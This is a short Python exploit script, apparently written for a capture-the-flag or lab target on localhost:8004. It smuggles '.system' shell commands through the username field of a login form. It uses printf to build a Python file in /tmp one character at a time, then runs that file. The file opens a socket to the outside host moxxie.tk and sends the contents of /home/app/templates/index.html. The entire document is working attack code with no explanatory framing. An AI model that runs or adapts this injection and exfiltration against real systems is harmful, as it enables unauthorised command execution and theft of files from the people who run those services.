import requests

HOST = 'localhost'
PORT = 8004

script = "import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('moxxie.tk',18001));s.send(open('/home/app/templates/index.html','rb').read())"

def run(cmd):
    payload = {
        'username': '";\n.system {}\n'.format(cmd),
        'password': 'legoshi'
    }
    r = requests.post(f'http://{HOST}:{PORT}/login', data=payload)

run('printf "">/tmp/hal')
for c in script:
    run('printf "{}">>/tmp/hal'.format(c))
run("python /tmp/hal")
